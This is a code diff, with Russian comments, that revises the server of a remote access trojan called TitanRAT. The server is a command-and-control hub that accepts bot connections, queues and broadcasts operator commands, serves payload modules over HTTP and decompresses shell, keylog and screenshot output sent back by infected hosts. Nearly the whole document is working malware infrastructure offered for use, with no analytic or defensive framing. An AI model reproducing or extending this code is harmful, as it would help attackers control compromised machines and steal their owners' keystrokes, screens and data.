@@ -1,4 +1,4 @@
-// Server/Program.cs
+// Server/Program.cs — исправленная версия с корректной обработкой SHELL_OUT:
 using TitanRAT.Server;
 using System.Net;
 using System.Net.Sockets;
@@ -6,45 +6,81 @@ using System.Collections.Concurrent;
 using System.Text;
 using System.Text.Json;
 using System.Text.Json.Serialization;
+using System.Runtime.InteropServices;
+
+public static class Win32Decompress
+{
+    [DllImport("ntdll.dll", SetLastError = true)]
+    private static extern uint RtlDecompressBuffer(
+        ushort CompressionFormat,
+        IntPtr UncompressedBuffer,
+        uint UncompressedBufferSize,
+        IntPtr CompressedBuffer,
+        uint CompressedBufferSize,
+        out uint FinalUncompressedSize);
+
+    private const ushort COMPRESSION_FORMAT_XPRESS = 0x0003;
+
+    public static string Decompress(string base64Payload)
+    {
+        try
+        {
+            byte[] compressed = Convert.FromBase64String(base64Payload);
+            uint maxOutSize = Math.Max((uint)compressed.Length * 8, 2 * 1024 * 1024);
+            IntPtr outBuf = Marshal.AllocHGlobal((int)maxOutSize);
+            IntPtr inBuf = Marshal.AllocHGlobal(compressed.Length);
+            try
+            {
+                Marshal.Copy(compressed, 0, inBuf, compressed.Length);
+                uint resultSize;
+                uint status = RtlDecompressBuffer(COMPRESSION_FORMAT_XPRESS, outBuf, maxOutSize, inBuf, (uint)compressed.Length, out resultSize);
+                if (status == 0)
+                {
+                    byte[] result = new byte[resultSize];
+                    Marshal.Copy(outBuf, result, 0, (int)resultSize);
+                    return Encoding.UTF8.GetString(result);
+                }
+                return $"[DECOMPRESS_ERR: 0x{status:X}]";
+            }
+            finally
+            {
+                Marshal.FreeHGlobal(inBuf);
+                Marshal.FreeHGlobal(outBuf);
+            }
+        }
+        catch (Exception ex) { return $"[DECOMPRESS_EX: {ex.Message}]"; }
+    }
+}
 
 class Program
 {
-    // Реассемблер сообщений (чанки + потоковая агрегация)
     private static readonly MessageReassembler _reassembler = new();
-    
-    // Сессии клиентов
     private static readonly ConcurrentDictionary<string, ClientSession> _clients = new();
-    
-    // Флаги и настройки
     private static volatile bool _running = true;
     private const int TcpPort = 12345;
     private const int HttpPort = 12346;
     private static readonly CancellationTokenSource _httpCts = new();
-    
+
     static async Task Main(string[] args)
     {
+        // Регистрация кодовых страниц
+        Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
+        Console.OutputEncoding = Encoding.UTF8;
+
         Console.WriteLine($"[C2] Starting TCP server on port {TcpPort}...");
         Console.WriteLine($"[C2] Starting HTTP API on port {HttpPort}...");
-        
-        // Запуск TCP-слушателя
         var tcpListener = new TcpListener(IPAddress.Any, TcpPort);
         tcpListener.Start();
         var tcpTask = Task.Run(() => AcceptTcpClientsAsync(tcpListener));
-        
-        // Запуск HTTP API
         var httpTask = Task.Run(() => RunHttpApiAsync(_httpCts.Token));
-        
-        // Консоль оператора
         await HandleConsoleInputAsync();
-        
-        // Корректное завершение
         _running = false;
         _httpCts.Cancel();
         tcpListener.Stop();
         foreach (var session in _clients.Values) session.Close();
         await Task.WhenAll(tcpTask, httpTask);
     }
-    
+
     private static async Task AcceptTcpClientsAsync(TcpListener listener)
     {
         while (_running)
@@ -57,78 +93,79 @@ class Program
             catch when (_running) { }
         }
     }
-    
+
     private static async Task HandleClientAsync(TcpClient client)
     {
         var session = new ClientSession(Guid.NewGuid().ToString(), client);
-        string? line;
-        
         try
         {
-            // Рукопожатие: HELLO
-            line = await session.ReadLineAsync();
-            if (line != "HELLO") { session.Close(); return; }
-            await session.SendCommandAsync("ACK");
-            
-            // Регистрация: REGISTER:hostname
-            line = await session.ReadLineAsync();
-            if (line?.StartsWith("REGISTER:") != true) { session.Close(); return; }
-            
-            session.Hostname = line["REGISTER:".Length..];
+            // Бинарное HELLO
+            var raw = await session.ReadBinaryAsync();
+            if (raw == null) return;
+            if (Encoding.UTF8.GetString(raw) != "HELLO") { session.Close(); return; }
+            await session.SendBinaryAsync(Encoding.UTF8.GetBytes("ACK"));
+
+            // Бинарная регистрация
+            raw = await session.ReadBinaryAsync();
+            if (raw == null) return;
+            string reg = Encoding.UTF8.GetString(raw);
+            if (!reg.StartsWith("REGISTER:")) { session.Close(); return; }
+            session.Hostname = reg["REGISTER:".Length..];
             _clients[session.Id] = session;
             Console.WriteLine($"[+] Bot connected: {session.Hostname} ({session.Id})");
-            
-            await session.SendCommandAsync($"ID:{session.Id}");
-            
-            // Главный цикл обработки
+            await session.SendBinaryAsync(Encoding.UTF8.GetBytes($"ID:{session.Id}"));
+
             while (_running)
             {
-                line = await session.ReadLineAsync();
-                if (line == null) break;
+                raw = await session.ReadBinaryAsync();
+                if (raw == null) break;
+                string line = Encoding.UTF8.GetString(raw);
+                if (string.IsNullOrWhiteSpace(line)) continue;
 
-                // Игнорируем пустые строки
-                if (string.IsNullOrWhiteSpace(line)) continue; 
-                
                 session.LastSeen = DateTime.UtcNow;
 
-                // Обработка хартбитов (pong / BEAT:id) — "тихо", без вывода в консоль
                 if (line.StartsWith("BEAT:") || line == "pong")
                 {
                     var cmd = session.GetPendingCommand();
                     if (cmd != null)
                     {
                         Console.WriteLine($"[>] Sending queued command to {session.Id}: {cmd}");
-                        await session.SendCommandAsync(cmd);
+                        await session.SendBinaryAsync(Encoding.UTF8.GetBytes(cmd));
                     }
-                    // Если команд нет — просто игнорируем хартбит
                 }
                 else
                 {
-                    // Сохраняем ответ в историю сессии
+                    // Обработка сжатия
+                    if (line.StartsWith("XPRESS:"))
+                    {
+                        var b64Data = line.Substring(7);
+                        var decompressed = Win32Decompress.Decompress(b64Data);
+                        if (!decompressed.StartsWith("[DECOMPRESS"))
+                        {
+                            line = decompressed;
+                            Console.WriteLine($"[SERVER] Decompressed {b64Data.Length}b -> {line.Length}b");
+                        }
+                        else
+                        {
+                            Console.WriteLine($"[SERVER] {decompressed}");
+                            continue;
+                        }
+                    }
+
+                    // Обработка shell вывода: строка начинается с SHELL_OUT:
+                    if (line.StartsWith("SHELL_OUT:"))
+                    {
+                        string utf8Text = line.Substring(10);
+                        Console.WriteLine($"[RESPONSE] {session.Id}: {utf8Text}");
+                        continue;
+                    }
+
+                    // Для остальных сообщений добавляем в историю и реассемблер
                     session.AddResponse(line);
-                    
-                    // Пропускаем через реассемблер (чанки + потоковая агрегация)
                     var assembled = _reassembler.Process(session.Id, line);
-                    
                     if (assembled != null)
                     {
-                        // Убираем технический префикс для чистого терминального вывода
-                        string displayMsg = assembled;
-                        if (displayMsg.StartsWith("SHELL_OUT:"))
-                            displayMsg = displayMsg.Substring(10); // Remove "SHELL_OUT:"
-                            
-                        Console.WriteLine($"[RESPONSE] {session.Id}: {displayMsg}");
-                    }
-                    
-                    // Если пришло сообщение НЕ от шелла — сбрасываем буфер шелла (если он "завис")
-                    // Это нужно, если оператор переключился на другую команду, а шелл ещё не закончил
-                    if (!line.StartsWith("SHELL_OUT") && !line.StartsWith("KEYLOG") && !line.StartsWith("SCREENSHOT"))
-                    {
-                        var flushed = _reassembler.FlushStream(session.Id, "SHELL_OUT");
-                        if (flushed != null && flushed.StartsWith("SHELL_OUT:"))
-                        {
-                            Console.WriteLine($"[RESPONSE] {session.Id}: {flushed.Substring(10)}");
-                        }
+                        Console.WriteLine($"[RESPONSE] {session.Id}: {assembled}");
                     }
                 }
             }
@@ -144,16 +181,13 @@ class Program
             Console.WriteLine($"[-] Bot disconnected: {session.Hostname}");
         }
     }
-    
+
     private static async Task RunHttpApiAsync(CancellationToken token)
     {
         var listener = new HttpListener();
-    
         listener.Prefixes.Add($"http://localhost:{HttpPort}/");
         listener.Prefixes.Add($"http://127.0.0.1:{HttpPort}/");
-    
         listener.Start();
-    
         try
         {
             while (!token.IsCancellationRequested)
@@ -163,30 +197,20 @@ class Program
             }
         }
         catch (OperationCanceledException) { }
-        finally
-        {
-            listener.Stop();
-        }
+        finally { listener.Stop(); }
     }
-    
+
     private static async Task HandleHttpRequestAsync(HttpListenerContext context)
     {
         var request = context.Request;
         var response = context.Response;
-        
         try
         {
             var path = request.Url?.AbsolutePath ?? "/";
             var method = request.HttpMethod.ToUpper();
-            
             if (method == "GET" && path == "/clients")
             {
-                var clients = _clients.Values.Select(c => new {
-                    id = c.Id,
-                    hostname = c.Hostname,
-                    lastSeen = c.LastSeen.ToString("o"),
-                    queueSize = c.QueueSize
-                }).ToArray();
+                var clients = _clients.Values.Select(c => new { id = c.Id, hostname = c.Hostname, lastSeen = c.LastSeen.ToString("o"), queueSize = c.QueueSize }).ToArray();
                 await SendJsonAsync(response, clients);
             }
             else if (method == "POST" && path == "/send")
@@ -194,7 +218,6 @@ class Program
                 using var reader = new StreamReader(request.InputStream, request.ContentEncoding);
                 var body = await reader.ReadToEndAsync();
                 var payload = JsonSerializer.Deserialize<SendPayload>(body);
-                
                 if (payload != null && _clients.TryGetValue(payload.BotId, out var session))
                 {
                     session.EnqueueCommand(payload.Command);
@@ -224,7 +247,6 @@ class Program
             {
                 var moduleName = path["/modules/".Length..];
                 var modulePath = Path.Combine("modules", moduleName);
-                
                 if (File.Exists(modulePath))
                 {
                     var fileBytes = await File.ReadAllBytesAsync(modulePath);
@@ -254,7 +276,7 @@ class Program
             response.Close();
         }
     }
-    
+
     private static async Task SendJsonAsync(HttpListenerResponse response, object data)
     {
         var json = JsonSerializer.Serialize(data);
@@ -263,17 +285,15 @@ class Program
         response.ContentLength64 = bytes.Length;
         await response.OutputStream.WriteAsync(bytes, 0, bytes.Length);
     }
-    
+
     private static async Task HandleConsoleInputAsync()
     {
         while (_running)
         {
             var input = Console.ReadLine();
             if (string.IsNullOrWhiteSpace(input)) continue;
-            
             var parts = input.Split(' ', 3);
             var cmd = parts[0].ToLower();
-            
             switch (cmd)
             {
                 case "list":
@@ -284,7 +304,6 @@ class Program
                         Console.WriteLine($"{c.Id,-36} {c.Hostname,-20} {c.LastSeen:HH:mm:ss} {c.QueueSize}");
                     Console.WriteLine();
                     break;
-                    
                 case "send":
                     if (parts.Length < 3) { Console.WriteLine("Usage: send <id> <command>"); break; }
                     if (_clients.TryGetValue(parts[1], out var target))
@@ -292,12 +311,8 @@ class Program
                         target.EnqueueCommand(parts[2]);
                         Console.WriteLine($"[>] Command queued for {parts[1]}: {parts[2]}");
                     }
-                    else
-                    {
-                        Console.WriteLine($"[!] Bot {parts[1]} not found");
-                    }
+                    else { Console.WriteLine($"[!] Bot {parts[1]} not found"); }
                     break;
-                    
                 case "queue":
                     if (parts.Length < 2) { Console.WriteLine("Usage: queue <id>"); break; }
                     if (_clients.TryGetValue(parts[1], out var qSession))
@@ -305,12 +320,8 @@ class Program
                         Console.WriteLine($"\n[Queue for {parts[1]}] (size: {qSession.QueueSize})");
                         Console.WriteLine("(Commands are delivered on next heartbeat)");
                     }
-                    else
-                    {
-                        Console.WriteLine($"[!] Bot {parts[1]} not found");
-                    }
+                    else { Console.WriteLine($"[!] Bot {parts[1]} not found"); }
                     break;
-                    
                 case "clear_queue":
                     if (parts.Length < 2) { Console.WriteLine("Usage: clear_queue <id>"); break; }
                     if (_clients.TryGetValue(parts[1], out var cSession))
@@ -318,24 +329,17 @@ class Program
                         cSession.ClearQueue();
                         Console.WriteLine($"[>] Queue cleared for {parts[1]}");
                     }
-                    else
-                    {
-                        Console.WriteLine($"[!] Bot {parts[1]} not found");
-                    }
+                    else { Console.WriteLine($"[!] Bot {parts[1]} not found"); }
                     break;
-                    
                 case "broadcast":
                     if (parts.Length < 2) { Console.WriteLine("Usage: broadcast <command>"); break; }
-                    foreach (var c in _clients.Values)
-                        c.EnqueueCommand(parts[1]);
+                    foreach (var c in _clients.Values) c.EnqueueCommand(parts[1]);
                     Console.WriteLine($"[>] Command broadcast to {_clients.Count} bots");
                     break;
-                    
                 case "quit":
                     Console.WriteLine("[*] Shutting down...");
                     _running = false;
                     break;
-                    
                 default:
                     Console.WriteLine($"[!] Unknown command: {cmd}");
                     break;
@@ -344,12 +348,10 @@ class Program
     }
 }
 
-// Helper class for JSON deserialization
 class SendPayload
 {
     [JsonPropertyName("bot_id")]
     public string BotId { get; set; } = "";
-    
     [JsonPropertyName("command")]
     public string Command { get; set; } = "";
 }
